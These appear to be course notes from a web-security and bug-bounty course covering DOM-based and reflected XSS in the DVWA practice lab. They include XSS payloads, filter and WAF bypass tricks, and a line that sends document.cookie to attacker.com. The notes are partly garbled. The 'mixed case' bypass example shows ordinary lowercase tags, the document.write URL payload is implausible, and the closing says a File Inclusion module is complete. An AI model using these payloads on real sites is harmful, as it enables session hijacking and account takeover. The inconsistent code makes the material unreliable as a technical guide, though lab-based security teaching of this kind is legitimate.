## Module 56: DOM-Based Cross-Site Scripting (XSS)

### What is DOM-Based XSS?

**Definition:** DOM-Based Cross-Site Scripting is an attack where the application takes malicious input from an attacker-controlled source and passes it to a sink that supports dynamic code execution.

**Key Concepts:**

- **DOM:** Document Object Model - convention used to represent and work with objects in an HTML document
- **Source:** Where attacker injects malicious input
- **Sink:** Where malicious code gets executed

**In Short:** If an attacker is able to write their input in the application DOM, they will be able to execute XSS payloads on the target and perform various nefarious actions.

### Understanding XSS Basics

**What is XSS?**

- **Full Form:** Cross-Site Scripting
- **Type:** Input validation vulnerability
- **Cause:** Lack of input sanitization
- **Impact:** Malicious JavaScript execution

**How It Works:**

```
1. Application accepts user input
2. No validation/sanitization
3. Input rendered in HTML/JavaScript
4. Malicious script executes
5. Attacker gains control
```

**DOM-Based XSS Specifics:**

- Exploits DOM manipulation
- JavaScript creates/modifies HTML elements
- Malicious input written to DOM
- Code executes in victim's browser

---

## Module 57: DOM-Based XSS Practical (DVWA)

### Initial Setup

**Navigate to:**

```
DVWA → DOM Based Cross-Site Scripting
Security Level: Low
PHPIDS: Enabled
```

**Interface:**

```
Dropdown menu: "Please choose a language"
Options:
- English
- French
- German
- Spanish
```

### Testing Normal Functionality

**Select Language:**

```
Select: English
Result: "Default: English" displayed

Select: French
Result: "Default: French" displayed

Select: Spanish
Result: "Default: Spanish" displayed
```

**URL Pattern:**

```
http://localhost/vulnerabilities/xss_d/?default=English
                                           ↑
                                      Parameter in URL
```

### Attempting Basic XSS

**Intercept with Burp Suite:**

```
FoxyProxy → Burp (Enabled)
Intercept: ON
Select language: English
```

**Intercepted Request:**

```
GET /vulnerabilities/xss_d/?default=English HTTP/1.1
Host: localhost
```

**Send to Repeater** → Not much visible in response

**View Page Source:**

```
Nothing shows input/output clearly in source
```

### Source Code Analysis

**View Source:**

```php
<?php
// Low security
// No protection, anything goes!
?>
```

**Note:** No filters, no protection - should be exploitable!

### Testing XSS Payload

**Basic Payload:**

```html
<script>
  alert('hacked')
</script>
```

**Input in URL:**

```
?default=<script>alert('hacked')</script>
```

**Result:**

```
Hacking attempt detected!
Logged. Have a nice day.
```

**PHPIDS Blocked it!** (Web Application Firewall)

### Bypassing WAF with DOM-Based Technique

**Alternative Payload: document.write()**

**In Burp Repeater:**

```javascript
?default=English&document.write('<script>alert(document.domain)</script>')
```

**How document.write() Works:**

```javascript
document.write() // Writes directly to DOM
// Bypasses some WAF detections
// Different from direct <script> injection
```

**Modified Payload:**

```javascript
?default=English&document.write('<script>alert("hacked")</script>')
```

**Enter and Result:**

```
Popup appears!
Message: "hacked"
Success: DOM-Based XSS exploited! ✓
```

**Why It Worked:**

- document.write() writes to DOM
- Script tag inside function
- WAF didn't detect this pattern
- PHPIDS bypassed!

### Verifying in Browser

**Check Page Source:**

```html
<script>
document.write('<script>alert("hacked")</script>');
</script>
```

**DOM Successfully Manipulated!**

---

## Module 58: DOM-Based XSS - Medium Security

### Testing Medium Security

**Change Security Level:**

```
DVWA Security → Medium
Navigate to: DOM XSS
```

**Test Same Payload:**

```javascript
?default=English&document.write('<script>alert("hacked")</script>')
```

**Result:** Still works! Popup appears! ✓

**View Source - Medium:**

```php
<?php
// Strips out <script> tags
$input = str_replace("<script>", "", $input);
?>
```

**Filter:**

- Removes `<script>` tags
- Case-sensitive
- Only removes exact match

**But Our Payload Still Worked!**

**Why:**

```javascript
document.write('<script>alert("hacked")</script>')
↑ Script tag is INSIDE document.write()
↑ Not directly in parameter
↑ Filter doesn't catch it
```

**Key Point:** Our payload uses `document.write()` function, which writes the script tag to DOM after filter runs!

---

## Module 59: Showing Real-World Impact

### Stealing Cookies with XSS

**Current Payload:**

```javascript
document.write('<script>alert(document.domain)</script>')
```

**Shows:** Domain name in popup

**Cookie-Stealing Payload:**

```javascript
document.write('<script>alert(document.cookie)</script>')
```

**What Happens:**

```
1. User clicks malicious link
2. Payload executes
3. Popup shows: PHPSESSID=abc123xyz; security=low
4. Attacker sees session cookie!
```

**Real Attack Scenario:**

```
1. Attacker crafts malicious URL
2. Sends to victim via:
   - Email
   - Social media
   - Chat message
3. Victim clicks link
4. Cookie stolen
5. Attacker impersonates victim
```

**In Real Bug Bounty:**

- Show proof of concept with `alert(document.cookie)`
- Explain: Can send cookie to attacker's server
- Demonstrate: Session hijacking possible
- Impact: Complete account takeover

**Advanced (Sending to Server):**

```javascript
document.write('<script>
fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>')
```

---

## DOM-Based XSS Summary

### Key Concepts

**What We Learned:**
✓ DOM manipulation exploitation
✓ document.write() technique
✓ WAF bypass methods
✓ Cookie theft demonstration
✓ Real-world impact

### Attack Workflow

```
1. Find parameter reflected in DOM
2. Test basic XSS: <script>alert(1)</script>
3. If blocked, try alternatives:
   - document.write()
   - DOM manipulation methods
4. Bypass WAF/filters
5. Demonstrate cookie theft
6. Report with impact
```

### DOM-Based vs Other XSS

| Type          | Execution       | Storage    | Impact |
| ------------- | --------------- | ---------- | ------ |
| **DOM-Based** | Client-side DOM | Not stored | Medium |
| **Reflected** | Immediate       | Not stored | Medium |
| **Stored**    | Persistent      | Database   | High   |

---

## Module 60: Reflected Cross-Site Scripting

### What is Reflected XSS?

**Definition:** XSS and Cross-Site Scripting is a type of security vulnerability where attackers inject malicious code, typically in the form of a script, into a website or web application.

**In Reflected XSS:**

- Hacker sends a link with a piece of code to the website
- When you click on it, website reflects the harmful code back to your browser
- It looks like something you trust
- Your browser executes it, not realizing it's a trick
- This lets hackers steal data, hijack accounts, or do other harmful things
- All because the website didn't properly check the input it was reflecting

### Key Characteristics

**Reflected XSS:**

- Input immediately reflected on page
- Not stored in database
- Requires victim to click malicious link
- Common in search boxes
- Common in error messages
- Common in any form that shows your input

**Where to Look:**

```
✓ Search functionality
✓ Error messages
✓ URL parameters displayed on page
✓ Forms that echo your input
✓ Any user input reflected immediately
```

---

## Module 61: Reflected XSS Practical (DVWA)

### Initial Setup

**Navigate to:**

```
DVWA → Reflected Cross-Site Scripting
Security Level: Low
PHPIDS: Enabled
```

**Interface:**

```
Input field: "What's your name?"
Button: Submit
```

### Testing Normal Functionality

**Input: Kratos**

```
Submit
Result: "Hello Kratos"
```

**Observation:**

- Input reflected on page
- Shows in URL: `?name=Kratos`
- Displays on page: "Hello Kratos"

**This is Reflected XSS territory!**

### Testing for HTML Injection

**Why Test HTML First:**

- HTML injection = XSS likely possible
- Quick test for input validation
- Two vulnerabilities in one check

**Payload:**

```html
<h1>Test</h1>
```

**Result:**

```
"Test" displays as large heading!
HTML rendered successfully!
```

**Conclusion:** No HTML sanitization = XSS possible!

### Attempting Basic XSS

**Payload:**

```html
<script>
  alert('hacked')
</script>
```

**Result:**

```
Hacking attempt detected!
Logged. Have a nice day.
```

**PHPIDS blocked it again!**

### Source Code Analysis

**View Source - Low:**

```php
<?php
// XSS protection header = 0 (disabled)
$name = $_GET['name'];
echo "Hello " . $name;  // No sanitization!
?>
```

**Vulnerability:**

- Takes input directly
- No validation
- No sanitization
- Echoes back to page
- Perfect for XSS!

### Bypassing PHPIDS

**After Multiple Attempts:**

```
Note: PHPIDS is very effective at blocking payloads
Tried multiple variations - all blocked
```

**Solution: Disable PHPIDS for testing**

```
DVWA Setup → Disable PHPIDS
```

**Test Again:**

```html
<script>
  alert(1)
</script>
```

**Result:** Popup appears! ✓

**Verify in Source:**

```html
<html>
  Hello
  <script>
    alert(1)
  </script>
</html>
```

**XSS Confirmed!**

---

## Module 62: Reflected XSS - Medium Security

### Testing Medium Security

**Change Security Level:**

```
DVWA Security → Medium
PHPIDS: Disabled (for testing)
```

**View Source - Medium:**

```php
<?php
$name = $_GET['name'];
$name = str_replace("<script>", "", $name);  // Filter!
echo "Hello " . $name;
?>
```

**Filter:** Removes `<script>` tags

### Bypass Technique: Case Variation

**Attempt 1: Normal**

```html
<script>
  alert(1)
</script>
Result: "Hello alert(1)" (script tags removed)
```

**Attempt 2: Mixed Case**

```html
<script>
  alert(1)
</script>
```

**Result:** Popup appears! ✓

**Why It Works:**

```php
str_replace("<script>", "", $name);
↑ Case-sensitive!
↑ Only matches exact lowercase "<script>"
↑ Doesn't match "<ScRiPt>"
```

**Filter Bypassed!**

### Demonstrating Real Impact

**Cookie Theft Payload:**

```html
<script>
  alert(document.cookie)
</script>
```

**Result:**

```
Popup shows: PHPSESSID=abc123; security=medium
Session cookie exposed!
```

**Attack Scenario:**

```
1. Attacker crafts URL:
   ?name=<ScRiPt>alert(document.cookie)</ScRiPt>

2. Sends to victim:
   "Check out this funny page!"
   [malicious link]

3. Victim clicks → Cookie stolen
4. Attacker uses session cookie
5. Complete account takeover
```

**In Bug Bounty Report:**

```
Vulnerability: Reflected XSS
Severity: Medium-High
Impact: Session hijacking, account takeover
PoC: [Screenshot of cookie in alert]
Recommendation: Implement proper output encoding
```

---

## Reflected XSS Summary

### Key Concepts

**What We Learned:**
✓ Reflected XSS basics
✓ HTML injection testing
✓ Case-sensitive filter bypass
✓ Cookie theft demonstration
✓ Real-world attack scenarios

### Common Locations

**Where to Test:**

- Search boxes: `?search=<payload>`
- Error pages: `?error=<payload>`
- URL parameters: `?id=<payload>`
- Forms echoing input
- User profile pages
- Comment preview features

### Bypass Techniques

| Filter Type        | Bypass Method                  |
| ------------------ | ------------------------------ |
| Case-sensitive     | `<ScRiPt>`                     |
| Removes once       | `<scr<script>ipt>`             |
| Blocks "script"    | `<img src=x onerror=alert(1)>` |
| Blocks parentheses | Use template literals          |
| Blocks quotes      | Use String.fromCharCode()      |

### Impact Demonstration

**For Bug Bounty:**

1. Prove XSS exists: `alert(1)`
2. Show cookie access: `alert(document.cookie)`
3. Explain real attack: Send to attacker's server
4. Demonstrate impact: Account takeover possible

---

**Course Status:** DOM & Reflected XSS Complete
**Next:** Stored XSS (Most Critical)

---

**Course Status:** File Inclusion Complete
**Next Topics:**

- File Upload Vulnerabilities
- SQL Injection Deep Dive
- XSS (Cross-Site Scripting)
- Authentication Bypass
- Session Management

---

_This completes the File Inclusion module. Practice these techniques in legal environments before attempting real bug bounty programs._

---
